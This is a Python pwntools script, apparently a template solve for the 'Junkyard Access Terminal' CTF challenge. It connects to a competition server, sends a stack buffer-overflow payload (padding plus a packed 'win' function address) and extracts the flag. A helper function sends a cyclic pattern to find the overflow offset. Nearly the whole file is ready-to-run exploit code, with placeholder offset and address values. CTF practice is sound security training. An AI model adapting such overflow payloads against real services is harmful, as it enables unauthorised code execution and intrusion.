#!/usr/bin/env python3
"""
Template exploit script for Junkyard Access Terminal challenge.
REQUIRES: Actual binary file for analysis to fill in the correct values.

Usage:
1. Download the actual 'jat' binary from the CTF platform
2. Run: objdump -d jat | grep "<win>:" to get WIN_ADDR
3. Run cyclic pattern test to find OFFSET
4. Update the values below
5. Run this script
"""

from pwn import *

# ============================================================================
# CONFIGURATION - UPDATE THESE VALUES AFTER ANALYZING THE BINARY
# ============================================================================

WIN_ADDR = 0x08048596  # <<<< UPDATE: Get from objdump -d jat | grep "<win>:"
OFFSET = 32            # <<<< UPDATE: Find using cyclic pattern
BAND = 6               # Which access band to select (1-6)

HOST = "chals.uscc-cyberbowl-2025.ctf.institute"
PORT = 3015

# ============================================================================
# EXPLOIT
# ============================================================================

context.log_level = 'info'
context.arch = 'i386'

def exploit():
    print("[*] Connecting to challenge server...")
    conn = remote(HOST, PORT)
    
    # Receive initial prompt
    print("[*] Receiving prompt...")
    conn.recvuntil(b"Enter access band (1-6): ")
    
    # Send access band selection
    print(f"[*] Selecting access band: {BAND}")
    conn.sendline(str(BAND).encode())
    
    # Wait for secondary input prompt (the space character)
    conn.recv(timeout=1)
    
    # Craft exploit payload
    payload = b"A" * OFFSET + p32(WIN_ADDR)
    print(f"[*] Sending payload:")
    print(f"    - Padding: {OFFSET} bytes")
    print(f"    - Win address: 0x{WIN_ADDR:08x}")
    print(f"    - Total length: {len(payload)} bytes")
    
    conn.sendline(payload)
    
    # Receive response
    print("[*] Waiting for response...")
    try:
        response = conn.recvall(timeout=5)
        output = response.decode('utf-8', errors='ignore')
        
        print("\n" + "="*70)
        print("RESPONSE:")
        print("="*70)
        print(output)
        print("="*70)
        
        if 'USCC{' in output:
            flag_start = output.index('USCC{')
            flag_end = output.index('}', flag_start) + 1
            flag = output[flag_start:flag_end]
            print(f"\n[+] FLAG FOUND: {flag}")
        elif 'RAIDER KING' in output:
            print("\n[+] Successfully accessed RAIDER KING level!")
        
    except Exception as e:
        print(f"[-] Error receiving response: {e}")
    
    conn.close()

def find_offset():
    """Helper function to find the correct buffer overflow offset"""
    print("[*] Finding buffer overflow offset...")
    print("[*] Send cyclic pattern and check crash")
    
    pattern = cyclic(200)
    print(f"[*] Pattern: {pattern[:50]}...")
    
    conn = remote(HOST, PORT)
    conn.recvuntil(b":")
    conn.sendline(b"6")
    conn.recv(timeout=1)
    conn.sendline(pattern)
    
    try:
        response = conn.recvall(timeout=3)
        print(f"[*] Response: {response}")
    except:
        pass
    
    conn.close()
    print("[*] Use cyclic_find() to locate offset from crash")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == '--find-offset':
        find_offset()
    else:
        print("\n" + "="*70)
        print("Junkyard Access Terminal - Exploit Script")
        print("="*70)
        print("\nWARNING: This script uses placeholder values!")
        print("You MUST update WIN_ADDR and OFFSET after analyzing the binary.\n")
        print("To find offset: python3 solve_template.py --find-offset\n")
        
        response = input("Continue with current values? (y/N): ")
        if response.lower() == 'y':
            exploit()
        else:
            print("\n[*] Please update WIN_ADDR and OFFSET in the script first.")
            print("[*] Steps:")
            print("    1. Download 'jat' binary")
            print("    2. objdump -d jat | grep '<win>:'")
            print("    3. python3 solve_template.py --find-offset")
            print("    4. Update script values")
            print("    5. Run exploit")
